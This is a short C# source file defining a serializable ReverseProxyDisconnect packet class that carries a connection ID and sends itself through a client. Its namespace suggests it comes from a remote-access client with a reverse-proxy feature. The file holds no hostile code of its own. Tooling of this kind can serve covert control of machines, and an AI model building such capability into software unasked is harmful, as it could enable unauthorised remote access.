using ProtoBuf;
using xClient.Core.Packets;

namespace xClient.Core.ReverseProxy.Packets
{
    [ProtoContract]
    public class ReverseProxyDisconnect : IPacket
    {
        [ProtoMember(1)]
        public int ConnectionId { get; set; }

        public ReverseProxyDisconnect(int connectionId)
        {
            this.ConnectionId = connectionId;
        }

        public ReverseProxyDisconnect()
        {
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}
